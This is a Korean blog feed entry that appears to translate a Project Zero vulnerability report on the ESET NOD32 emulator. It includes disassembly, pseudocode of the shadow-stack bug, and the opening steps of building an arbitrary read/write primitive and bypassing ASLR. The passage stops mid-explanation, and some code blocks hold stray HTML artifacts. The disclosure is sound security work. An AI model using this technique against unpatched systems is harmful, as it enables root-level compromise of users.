<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

  <title><![CDATA[Category: googleprojectzero | 99 Cruster]]></title>
  <link href="http://binerdd.github.io/blog/categories/googleprojectzero/atom.xml" rel="self"/>
  <link href="http://binerdd.github.io/"/>
  <updated>2015-09-22T22:32:30+09:00</updated>
  <id>http://binerdd.github.io/</id>
  <author>
    <name><![CDATA[binerdd]]></name>
    
  </author>
  <generator uri="http://octopress.org/">Octopress</generator>

  
  <entry>
    <title type="html"><![CDATA[(번역)Analysis and Exploitation of an ESET Vulnerability]]></title>
    <link href="http://binerdd.github.io/blog/2015/07/10/analysis-and-exploitation-of-eset-vulnerability-kor/"/>
    <updated>2015-07-10T07:00:25+09:00</updated>
    <id>http://binerdd.github.io/blog/2015/07/10/analysis-and-exploitation-of-eset-vulnerability-kor</id>
    <content type="html"><![CDATA[<p><a href="http://googleprojectzero.blogspot.kr/2015/06/analysis-and-exploitation-of-eset.html">original post</a></p>

<h3>우리는 보안 소프트웨어의 위험성(risk)과 이익(benefit) 사이의 트레이드오프 관계를 이해하고 있는가?</h3>

<p>Tavis Ormandy, 2015년 6월</p>

<h1>소개</h1>

<p>많은 백신 제품들은 언패커들을 몇 사이클 정도 실행시킨 후에 시그니처를 적용하기 위해 에뮬레이션 기능을 포함하고 있다. ESET NOD32 제품은 <a href="https://msdn.microsoft.com/en-us/library/windows/hardware/ff557282(v=vs.85">minifilter</a>.aspx) 또는 <a href="https://developer.apple.com/library/mac/documentation/Darwin/Conceptual/KEXTConcept/KEXTConceptIntro/introduction.html">kext</a>를 이용하여 실행가능한 코드가 탐지되면 디스크 I/O를 가로챈 후 분석 및 에뮬레이트를 한다.</p>

<p>공격자들은 웹브라우저, 이메일, 인스턴트메신저(IM), 파일공유, 네트워크저장소, USB 외에도 수백개의 다른 벡터를 통해서 I/O를 발생시킬 수 있다. 메시지나 파일, 이미지 또는 다른 데이터들을 수신할 때마다 신뢰할 수 없는 데이터가 디스크를 거쳐갈 가능성은 항상 열려있다. 신뢰할 수 없는 코드의 에뮬레이션을 유발하는 것은 공격자들에겐 너무나 쉽기 때문에 에뮬레이터는 견고하고 분리되어있어야 한다.</p>

<p>하지만 ESET의 에뮬레이션 기능을 분석해본 결과, 안전하지가 않다는 것을 밝혀냈으며 쉽게 공격을 당하거나 악용될 수 있다. 본 보고서는 ESET의 원격에서 루트권한을 탈취할 수 있는 익스플로잇 개발에 대한 내용을 설명하며, 공격자들이 어떻게 ESET 사용자들에 대한 보안을 훼손시킬 수 있는지를 보여준다. 이것은 이론적인 위험이 아니라 충분히 실제로 일어날 수 있으며, 최근 <a href="https://firstlook.org/theintercept/2015/06/22/nsa-gchq-targeted-kaspersky/">근거</a>를 통해 실력이 뛰어난 공격자들이 백신 제품에 관심을 가지기 시작한 것을 알 수 있다.</p>

<h1>FAQ</h1>

<h3>어떤 플랫폼들이 영향을 받는가?</h3>

<p>ESET 시그니처들의 형태는 실행가능한 코드이며, DAT와 NUP파일로부터 런타임에 언패킹되어 모듈로 로드된다. DAT 파일은 모든 플랫폼 및 버전들이 공유하기 때문에, 결과적으로 모든 플랫폼이 영향을 받는다.</p>

<h3>어떤 제품 및 버전이 영향을 받는가?</h3>

<p>현재 지원대상인 모든 ESET 버전 및 에디션은 취약한 코드를 모두 공유한다.</p>

<p>아래는 취약한 제품들 중 일부 목록이다.</p>

<ul>
<li>ESET Smart Security for Windows</li>
<li>ESET NOD32 Antivirus for Windows</li>
<li>ESET Cyber Security Pro for OS X</li>
<li>ESET NOD32 For Linux Desktop</li>
<li>ESET Endpoint Security for Windows and OS X</li>
<li>ESET NOD32 Business Edition</li>
</ul>


<h3>기본(default) 설정도 영향을 받는가?</h3>

<p>영향을 받는다.</p>

<h3>&ldquo;실시간 스캔&rdquo; 기능을 비활성화 시켜도 취약한가?</h3>

<p>만약 실시간 스캔 기능을 비활성화시킨다면, 컨텍스트 메뉴나 GUI 상에서 수동으로 파일을 스캔할 경우에만 영향을 받는다.</p>

<p>하지만 기억할 점은, 실시간 스캔을 비활성화시키면 ESET가 주기적으로 최대한의 보호를 받고 있지 못하다는 알림을 띄워 실시간 스캔을 활성화시키도록 유도할 것이다.</p>

<h3>분석을 위해 익스플로잇을 공개했는가?</h3>

<p>실제로 동작하는 <a href="https://code.google.com/p/google-security-research/issues/detail?id=456">익스플로잇</a>을 보고서와 함께 첨부했다.</p>

<h3>업데이트는 공개되었는가?</h3>

<p>ESET는 스캔 엔진에 대한 <a href="http://www.virusradar.com/en/update/info/11824">업데이트</a>를 2015년 6월 22일에 배포했다.</p>

<h1>영향</h1>

<p>ESET을 실행하고 있는 네트워크에 연결된 컴퓨터라면, 완전히 보안성을 훼손 당할 수 있다. 완전하게 보안성이 훼손된다는 의미는, 접근권한과 무관하게 시스템상의 파일읽기/쓰기/수정, 루트킷 및 원하는 프로그램 설치, 카메라/마이크로폰/스캐너 등의 하드웨어 장비에 접근, 시스템의 모든 활동(키스트로크, 네트워크 트래픽)의 로깅 등이 모두 가능하다는 말이다.</p>

<p>완전히 보안성이 훼손당했다는 증거(익스플로잇이 실행되었다는 증거)는 전혀 사용자에게 나타나지 않는다. 왜냐면 disk I/O는 운영체제의 일반적인 행위의 일부분이기 때문이다. 또한 익스플로잇을 하기 위해 사용자의 개입이 전혀 필요없기 때문에 이 취약점은 <a href="https://en.wikipedia.org/wiki/Computer_worm">웜</a>으로 악용될 수 있다. ESET를 배포하여 사용하고 있는 기업환경에서는 아주 빠르게 전파되어 순식간에 기업전체가 보안성을 훼손당할 수 있으며 사업관련 데이터, PII, 영업비밀, 백업, 회계문서 등이 모두 유출되거나 삭제될 수 있다.</p>

<p>이 모든것은 스캔 작업자체가 높은 권한을 가지고 있기 때문에 가능한 시나리오다. 윈도우 네트워크의 경우, ekm.exe 프로세스를 장악하여 공격자에게 NT AUTHORITY\SYSTEM 권한을 부여할 수 있다. 맥과 리눅스는 esets_daemon 프로세스를 장악하여 공격자에게 루트권한을 부여할 수 있다.</p>

<p>Figure 1.은 익스플로잇 시나리오를 설명하는 비디오다. 일반적인 사용자가 ESET NODE32 비지니스 에디션을 설치한 환경(기본설정)에서 링크를 클릭할 경우, 공격자는 루트권한으로 임의의 명령어를 실행할 수 있다. 악성 링크가 유일한 공격벡터는 아니며, 수백개의 가능한 벡터중 하나를 설명한 것에 불과하다.</p>

<p>모든 버전,플랫폼 및 제품들은 기본설정 환경에서 영향을 받으며, 익스플로잇 시나리오와 가능한 익스플로잇 페이로드들에 대한 더 많은 예제를 알고 싶다면, 아래 &ldquo;Sample Payloads"를 참고하면 된다.</p>

<iframe width="420" height="315" src="https://www.youtube.com/embed/Sk-CuFMXods" frameborder="0" allowfullscreen></iframe>


<p>Figure 1. ESET 기본설치 환경에서 웹브라우저를 통한 공격 시나리오 동영상 <a href="http://youtu.be/Sk-CuFMXods">http://youtu.be/Sk-CuFMXods</a></p>

<h1>기술적인 분석</h1>

<p>위 Figure 1에서 익스플로잇한 취약점은 에뮬레이트된 스택 작업들을 섀도우(또는 복제)하는 ESET NOD32 시그니처에 존재한다. 시그니처는 최소 3개의 섹션과 IMAGE_SECTION_HEADER의 IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE | IMAGE_SCN_CNT_CODE 속성이 필요하다.</p>

<p>엔트리포인트의 첫번째 명령어는 CALL이 필수이며, CALL은 PUSHA 명령어와 PUSHF 명령어가 연속으로 존재하는 곳으로 분기해야 한다.</p>

<p>이 조건들이 만족된다면, 시그니처는 x86 에뮬레이터 상에서 80,000 사이클 동안 코드를 single-step 한다. 각각의 명령어를 실행한 후에는 바로전에 실행한 명령어의 opcode가 스택 작업이였는지 체크한다. 만약 스택 작업이였다면, PUSH, POP 그리고 ESP 레지스터에 대한 산술연산을 자신의 40 바이트 스택 버퍼에 그대로 섀도우한다. 섀도우 스택의 목적은 악성코드들이 일반적으로 메모리에 쓴다고 알려진 값들이 PUSHA;PUSHF 명령어로 할당된 공간에 써지는지 확인하여 악성코드를 탐지하는 것이다. 이런 목적 때문에 40 바이트밖에 안되는 작은 섀도우 스택을 사용하는 것으로 예상되며, 아마도 엔트리포인트 난독화를 탐지하는 방법인 것 같다.</p>

<p>아래는 ESP에 대한 산술연산을 섀도우하는 코드이다.</p>

<p><div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">load:</span><span class="nf">F33E0BD3</span> <span class="nb">Ch</span><span class="nv">eckEspArith</span><span class="p">:</span>                     <span class="o">&lt;</span><span class="nv">br</span><span class="o">/&gt;</span>
<span class="nl">load:</span><span class="nf">F33E0BD3</span>                 <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mi">6</span>  <span class="p">(</span><span class="nv">a</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BD6</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BD8</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>
<span class="nl">load:</span><span class="nf">F33E0BDF</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BE1</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="p">],</span> <span class="mh">124h</span>
<span class="nl">load:</span><span class="nf">F33E0BEB</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BED</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand1</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="mi">9</span>
<span class="nl">load:</span><span class="nf">F33E0BF1</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0C06</span>
<span class="nl">load:</span><span class="nf">F33E0BF3</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand1</span><span class="o">+</span><span class="mh">24h</span><span class="p">]</span> <span class="p">(</span><span class="nv">b</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BF6</span>                 <span class="nv">shr</span>     <span class="nb">eax</span><span class="p">,</span> <span class="mi">2</span>
<span class="nl">load:</span><span class="nf">F33E0BF9</span>                 <span class="nv">sub</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="nb">eax</span> <span class="o">&amp;</span><span class="nv">copy</span><span class="c1">;</span>
<span class="nl">load:</span><span class="nf">F33E0BFB</span>                 <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.InstructionSize</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0BFF</span>                 <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span> <span class="p">(</span><span class="nv">d</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0C01</span>                 <span class="nv">jmp</span>     <span class="nv">InstructionComplete</span></code></pre></div></p>

<p>(a) 비교문은 산술연산 클래스의 명령어인지 확인하는 것이며, 그 뒤로 명령어의 인자(operand)를 확인하는 코드가 나온다. (b)에서는 상수 인자를 가져오고 &copy;는 새도우 스택 포인터에서 가져온 인자값을 뺀다. 가상 프로그램 카운터는 (d)명령어 다음 위치로 증가한다.</p>

<p><div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">oad:</span><span class="nf">F33E0B61</span> <span class="nb">Ch</span><span class="nv">eckPush</span><span class="p">:</span>
<span class="nl">load:</span><span class="nf">F33E0B61</span>                 <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">10Eh</span>       <span class="p">(</span><span class="nv">a</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B67</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nb">Ch</span><span class="nv">eckPop</span>
<span class="nl">load:</span><span class="nf">F33E0B69</span>                 <span class="nv">push</span>    <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.BranchRelated</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B6F</span>                 <span class="nv">lea</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B75</span>                 <span class="nv">push</span>    <span class="nb">eax</span>
<span class="nl">load:</span><span class="nf">F33E0B76</span>                 <span class="nv">call</span>    <span class="nv">GetOperand</span>      <span class="p">(</span><span class="nv">b</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B7B</span>                 <span class="nv">mov</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">ebx</span><span class="o">*</span><span class="mi">4</span><span class="o">+</span><span class="nv">EmulatedStack</span><span class="p">],</span> <span class="nb">eax</span> <span class="o">&amp;</span><span class="nv">copy</span><span class="c1">;</span>
<span class="nl">load:</span><span class="nf">F33E0B7F</span>                 <span class="nv">inc</span>     <span class="nb">ebx</span>
<span class="nl">load:</span><span class="nf">F33E0B80</span>                 <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.InstructionSize</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B84</span>                 <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>        <span class="c1">; Increment Program Counter</span>
<span class="nl">load:</span><span class="nf">F33E0B86</span>                 <span class="nv">cmp</span>     <span class="nb">ebx</span><span class="p">,</span> <span class="mh">0Ah</span>        <span class="p">(</span><span class="nv">d</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0B89</span>                 <span class="nv">jb</span>      <span class="nv">InstructionComplete</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span> <span class="nv">StackOutOfBounds</span><span class="p">:</span>                       <span class="c1">; CODE XREF: sub_F33E0A70+D7j</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span>                                         <span class="c1">; sub_F33E0A70+DFj &amp;hellip;</span>
<span class="nl">load:</span><span class="nf">F33E0B8F</span>                 <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">EmulatorObject</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0B92</span>                 <span class="nv">call</span>    <span class="nv">ShutdownEmulator</span></code></pre></div></p>

<p>(a)는 PUSH 명령어가 존재하는지 체크하는 코드이다. 인자는 에뮬레이터의 상태정보에서 가져오며(b) 이를 섀도우 스택에 저장한다&copy;. 스택포인터는 (d)에서 10 DWORDS 값과 비교해서 스택 경계를 벗어나지 않도록 한다.</p>

<p>POP 명령어도 마찬가지 패턴으로 구현되어있다.</p>

<p><div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="nl">load:</span><span class="nf">F33E0B9E</span> <span class="nb">Ch</span><span class="nv">eckPop</span><span class="p">:</span>                        <span class="o">&lt;</span><span class="nv">br</span><span class="o">/&gt;</span>
<span class="nl">load:</span><span class="nf">F33E0B9E</span>                 <span class="nv">cmp</span>     <span class="nb">esi</span><span class="p">,</span> <span class="mh">0F3h</span>             <span class="p">(</span><span class="nv">a</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BA4</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0BD3</span>
<span class="nl">load:</span><span class="nf">F33E0BA6</span>                 <span class="nv">cmp</span>     <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>  <span class="p">(</span><span class="nv">b</span><span class="p">)</span>
<span class="nl">load:</span><span class="nf">F33E0BAD</span>                 <span class="nv">jnz</span>     <span class="nv">short</span> <span class="nv">loc_F33E0B8F</span>
<span class="nl">load:</span><span class="nf">F33E0BAF</span>                 <span class="nv">test</span>    <span class="nb">ebx</span><span class="p">,</span> <span class="nb">ebx</span>  <span class="o">&amp;</span><span class="nv">copy</span><span class="c1">;</span>
<span class="nl">load:</span><span class="nf">F33E0BB1</span>                 <span class="nv">jz</span>      <span class="nv">short</span> <span class="nv">loc_F33E0B8F</span>
<span class="nl">load:</span><span class="nf">F33E0BB3</span>                 <span class="nv">mov</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.Operand</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0BB9</span>                 <span class="nv">dec</span>     <span class="nb">ebx</span>
<span class="nl">load:</span><span class="nf">F33E0BBA</span>                 <span class="nv">and</span>     <span class="nb">ecx</span><span class="p">,</span> <span class="mi">7</span>
<span class="nl">load:</span><span class="nf">F33E0BBD</span>                 <span class="nv">mov</span>     <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nb">ebx</span><span class="o">&lt;</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="o">+</span><span class="nv">EmulatedStack</span><span class="p">]</span> <span class="o">&amp;</span><span class="nv">copy</span><span class="c1">;</span>
<span class="nl">load:</span><span class="nf">F33E0BC1</span>                 <span class="nv">mov</span>     <span class="nb">ds</span><span class="p">:</span><span class="nv">EmulatedRegisters</span><span class="p">[</span><span class="nb">ecx</span><span class="o">&lt;/</span><span class="nv">em</span><span class="o">&gt;</span><span class="mi">4</span><span class="p">],</span> <span class="nb">eax</span>
<span class="nl">load:</span><span class="nf">F33E0BC8</span>                 <span class="nv">movzx</span>   <span class="nb">eax</span><span class="p">,</span> <span class="p">[</span><span class="nb">ebp</span><span class="o">+</span><span class="nv">Instruction.InstructionSize</span><span class="p">]</span>
<span class="nl">load:</span><span class="nf">F33E0BCC</span>                 <span class="nv">add</span>     <span class="nb">edi</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nl">load:</span><span class="nf">F33E0BCE</span>                 <span class="nv">jmp</span>     <span class="nv">InstructionComplete</span></code></pre></div></p>

<p>해당 코드는 POP 명령어를 제어하며, 명령어 클래스는 (a)에서 체크한다. 또한 레지스터에  데이터를 저장하는 명령어인지도 (b)에서 검증하며, 마지막으로 섀도우 스택 포인터가 0이 아닌지 확인한다&copy;. 왜냐면 만약 섀도우 스택 포인터가 0인 상태에서 POP 연산을 하게되면 포인터가 스택의 영역밖으로 벗어나기 때문이다.</p>

<p>버그는 새도우 스택 포인터가 스택 경계를 벗어나지 않도록 검증하는 부분이 ESP에 대한 산술연산을 이용하면 우회가 가능하다는 것이다. 아래 figure 3은 설명한 동작에 대한 pseudo 코드다.</p>

<p><div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">DWORD</span> <span class="n">ShadowStack</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="o">=</span> <span class="p">{</span><span class="mi">0</span><span class="p">};</span>
<span class="n">DWORD</span> <span class="n">ShadowStackPointer</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="p">(</span><span class="n">Cycles</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">Cycles</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span> <span class="mi">80000</span><span class="p">;</span> <span class="n">Cycles</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Step</span><span class="p">(</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">ProgramCounter</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="n">Instruction</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="k">if</span> <span class="p">(</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Class</span> <span class="o">==</span> <span class="n">PUSH</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">ShadowStack</span><span class="p">[</span><span class="n">ShadowStackPointer</span><span class="o">++</span><span class="p">]</span> <span class="o">=</span> <span class="n">Emulator</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">GetOperandValue</span><span class="p">();</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ShadowStackPointer</span> <span class="o">&amp;</span><span class="n">gt</span><span class="p">;</span><span class="o">=</span> <span class="mi">10</span><span class="p">)</span>
        <span class="n">Emulator</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Shutdown</span><span class="p">();</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Class</span> <span class="o">==</span> <span class="n">POP</span><span class="p">)</span> <span class="p">{</span>
   <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">ShadowStackPointer</span> <span class="o">||</span> <span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">Type</span> <span class="o">!=</span> <span class="n">REGISTER</span><span class="p">)</span>
        <span class="n">Emulator</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Shutdown</span><span class="p">();</span>
   <span class="n">Registers</span><span class="p">[</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">Register</span><span class="p">]</span> <span class="o">=</span> <span class="n">ShadowStack</span><span class="p">[</span><span class="n">ShadowStackPointer</span><span class="o">--</span><span class="p">];</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">Instruction</span><span class="p">.</span><span class="n">Class</span> <span class="o">==</span> <span class="n">ADD</span> <span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span><span class="o">&amp;</span><span class="n">amp</span><span class="p">;</span> <span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">Register</span> <span class="o">==</span> <span class="n">REG_ESP</span><span class="p">)</span> <span class="p">{</span>
    <span class="c1">// BUG!</span>
    <span class="n">ShadowStackPointer</span> <span class="o">-=</span> <span class="n">Instruction</span><span class="p">.</span><span class="n">Operand</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">Value</span> <span class="o">/</span> <span class="mi">4</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">if</span> <span class="p">(</span><span class="n">Emulator</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Fault</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">Emulator</span><span class="o">-&amp;</span><span class="n">gt</span><span class="p">;</span><span class="n">Shutdown</span><span class="p">();</span>
<span class="p">}</span>
<span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>

<span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">Emulator</span><span class="o">-&gt;</span><span class="n">Shutdown</span><span class="p">();</span></code></pre></div>
Figure 3. 에뮬레이션 루틴에 대한 Pseudo 코드</p>

<p>이와 같은 3 종류의 새도우 스택 동작을 이용하면, 익스플로잇의 기본요소(primitive)인 임의의 데이터를 원하는 위치에 쓰는 행위가 가능하여 결과적으로 에뮬레이터를 제어할 수 있다. 본 보고서의 뒷부분에서는 이 취약점을 이용하는 익스플로잇을 어떻게 개발하는지, 그리고 신뢰성이 높고 특정 플랫폼에 국한되지 않는(cross-platform) 익스플로잇을 개발하기 위해 극복해야하는 제한 및 한계를 다룬다.</p>

<h3>익스플로잇 기본요소(primitive) 구축하기</h3>

<p>산술연산을 이용해 포인터를 스택의 범위 밖으로 벗어나게 하고 PUSH와 POP 명령어로 상호작용함으로써 스탠다드 i586 머신코드를 이용해 에뮬레이터 내에서 진짜 스택의 값을 읽거나 데이터를 그곳에 쓸 수 있다.</p>

<p>하지만 실행할 수 있는 명령어 개수는 제한되어 있으며 스택에는 딱 한번만 쓸 수 있다. 왜냐하면 PUSH 동작 이후에 새도우 스택 포인터가 범위를 벗어났는지 체크를 하기 때문이다. 읽기의 경우, POP 명령어는 스택 포인터가 0이 아닌지만 확인하기 때문에 무제한으로 읽을 수 있다.</p>

<p>우린 가상의 스택 포인터(섀도우 스택)를 악용하는것이기 때문에 지역변수들은 레지스터 또는 .data 영역에 저장을 해야한다. 80K의 사이클은 충분해 보일 수 있지만 다양한 ESET 제품들을 신뢰성있게 익스플로잇하기 위해서 gadget을 찾다보면 금방 사이클이 소모된다.</p>

<h3>익스플로잇 mitigation 뛰어넘기</h3>

<p>첫번째 단계는 새도우 스택이 어디에 위치하고 있는지 알아내는 것이다. 왜냐하면 스택 작업들은 스택의 베이스 주소를 기준으로 상대적인 위치에서 동작하기 때문이다. 우리가 쓰거나 읽기를 할 수 있는 추측 가능한 메모리 위치는 존재하지 않지만, 실제 스택 프레임에 포인터를 push할 수 있고 실제 스택에 있는 저장된 스택포인터(직전 스택 프레임의 스택포인터)를 가상 레지스터로 가져올 수 있다.</p>

<p>우리가 몇 가지의 메모리 주소들을 알아낸다면 ASLR을 우회할 수 있으며, 인접한 메모리 영역으로 행동반경이 더이상 제한되어있지 않을 것이다. 이렇게 하기 위해서는 섀도우 스택 포인터가 가리키는 위치를 임의의 인덱스로 설정할 수 있어야하는데, 5 단계의 작업을 거쳐 섀도우 스택 포인터의 상위 bit들을 쉬프트해 제거해버리면 가능하다. 실제 인덱스 계산은 대략 아래와 같다.
* ESP에 대한 산술연산</p>

<p><div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="n">ShadowStackPointer</span> <span class="o">=</span> <span class="n">ShadowStackPointer</span> <span class="o">-</span> <span class="p">((</span><span class="kt">unsigned</span><span class="p">)</span> <span class="n">Index</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">);</span></code></pre></div></p>

<p>위 수식은 오버플로우때문에 한번의 작업으로 새도우 스택포인터를 증가시키는것은 불가능하다. 대신에 4번의 작업을 통해 다음 4의 배수로 만든 다음, 원하는 값으로 감소시키는 방법을 쓸 수 있다. 아래는 새도우 스택포인터를 123으로 만드는 방법을 시뮬레이션한 예이다.</p>

<p><div class="highlight"><pre><code class="language-c--" data-lang="c++"><span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span> <span class="mi">123</span> <span class="o">/</span> <span class="mi">4</span> <span class="o">+</span> <span class="mi">1</span>
<span class="err">$</span><span class="mi">1</span> <span class="o">=</span> <span class="mi">31</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mi">0</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">2</span> <span class="o">=</span> <span class="mh">0xc000001f</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mh">0xc000001f</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">3</span> <span class="o">=</span> <span class="mh">0x8000003e</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span><span class="o">/</span><span class="n">x</span> <span class="mh">0x8000003e</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">4</span> <span class="o">=</span> <span class="mh">0x4000005d</span>
<span class="p">(</span><span class="n">gdb</span><span class="p">)</span> <span class="n">p</span>   <span class="mh">0x4000005d</span> <span class="o">-</span> <span class="p">(</span><span class="o">-</span><span class="p">(</span><span class="mi">31U</span> <span class="o">*</span> <span class="mi">4</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">2</span><span class="p">)</span>
<span class="err">$</span><span class="mi">5</span> <span class="o">=</span> <span class="mi">124</span>
